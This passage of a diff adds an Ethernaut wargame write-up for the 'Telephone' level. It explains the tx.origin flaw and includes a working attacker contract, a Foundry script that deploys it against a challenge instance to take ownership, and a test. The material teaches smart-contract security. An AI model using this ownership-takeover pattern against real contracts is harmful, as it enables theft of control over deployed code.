@@ -365,3 +365,177 @@ forge script script/CoinFlipSolution.s.sol --rpc-url $INFURA_URL --broadcast
 
 ### Once the transaction is confirmed, submit the instance to complete the challenge!
 ![Well done img](assets/coinflip-2.png)
+
+---
+---
+
+## 4. Telephone
+
+
+## 🎯 Goal
+
+Claim ownership of the `Telephone` contract by ensuring `tx.origin != msg.sender` during the call to `changeOwner()`.
+
+---
+
+## 📖 Challenge Explanation
+
+This level demonstrates a classic vulnerability involving the misuse of `tx.origin`.
+
+```solidity
+if (tx.origin != msg.sender) {
+    owner = _owner;
+}
+```
+
+The goal is to trigger the `changeOwner()` function such that:
+- `msg.sender` is **a contract**
+- `tx.origin` is **your EOA**
+
+This condition is true **only if you call the function through a helper (attacker) contract**. When done correctly:
+- `tx.origin` will be your wallet address (EOA)
+- `msg.sender` will be the attacker contract
+
+This satisfies the condition and allows you to change ownership.
+
+---
+
+## 🛠️ Vulnerable Contract and Attack Contract
+
+This is the `Telephone.sol`, which includes both the vulnerable contract and the attacker contract:
+
+```javascript
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Telephone {
+    address public owner;
+
+    constructor() {
+        owner = msg.sender;
+    }
+
+    function changeOwner(address _owner) public {
+        if (tx.origin != msg.sender) {
+            owner = _owner;
+        }
+    }
+}
+
+// Attack Contract which claims the ownership of Telephone contract.
+contract AttackTelephone {
+    Telephone public target;
+
+    constructor(Telephone _target) {
+        target = _target;
+    }
+
+    function attackTel() public {
+        target.changeOwner(msg.sender);
+    }
+}
+```
+
+---
+
+## 🚀 Solution Script
+
+This is the `TelephoneSolution.s.sol` script that deploys the attacker contract and triggers the vulnerability:
+
+```javascript
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import {Telephone, AttackTelephone} from "../src/Telephone.sol";
+import "forge-std/Script.sol";
+import "forge-std/console.sol";
+
+contract TelephoneSolution is Script {
+
+    Telephone public target = Telephone(0x913f6Bc2B694E7336896143a30Ee6A7D1FF73B28);
+
+    function run() external {
+        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
+
+        // Deploy the AttackTelephone contract
+        AttackTelephone attack = new AttackTelephone(target);
+        console.log("Attack contract deployed owner: ", address(attack));
+
+        // Check initial owner
+        console.log("Initial Owner: ", target.owner());
+
+        // Execute the attack
+        attack.attackTel();
+
+        // Check new owner
+        console.log("New Owner: ", target.owner());
+
+        vm.stopBroadcast();
+    }
+}
+```
+
+---
+
+## ✅ Foundry Test
+
+This is the `TelephoneTest.t.sol` to test the vulnerability using Foundry's test suite:
+
+```javascript
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "forge-std/Test.sol";
+import "forge-std/console.sol";
+import {Telephone, AttackTelephone} from  "../src/Telephone.sol";
+
+contract TelephoneTest is Test {
+    Telephone public tel;
+    AttackTelephone public attack;
+
+    address public attacker = makeAddr("attacker");
+
+    function setUp() public {
+        tel = new Telephone();
+        attack = new AttackTelephone(tel);
+    }
+
+    function test_owner() public {
+        address initialOwner = tel.owner(); 
+        console.log("Initial Contract Owner: ", initialOwner);
+
+        vm.prank(attacker);
+        attack.attackTel();
+
+        console.log("After attack owner: ", tel.owner());
+
+        assertEq(attacker, tel.owner(), "Owner is not the same");
+    }
+}
+```
+
+---
+
+## 🧪 Run the Test
+
+### ✅ Test Output
+
+![Test Img](assets/telephone1.png)
+
+### 📝 Once the script is executed, submit the instance:
+
+![Done img](assets/telephone3.png)
+
+---
+
+## 📚 References
+
+- 🔗 [How to Solve Ethernaut Telephone (Hackernoon)](https://hackernoon.com/how-to-solve-the-ethernaut-games-level-4-telephone)
+- 🔍 [Using tx.origin for Authorization Is Dangerous](https://hackernoon.com/hacking-solidity-contracts-using-txorigin-for-authorization-are-vulnerable-to-phishing)
+- 🎥 [YouTube Explanation](https://www.youtube.com/watch?v=mk4wDlVB4ro&t=291s&pp=ygUQdHgub3JpZ2luIGF0dGFjaw%3D%3D)
+
+---
+
+## 🧠 Takeaway
+
+Using `tx.origin` for authentication is highly discouraged. Always use `msg.sender` for access control.
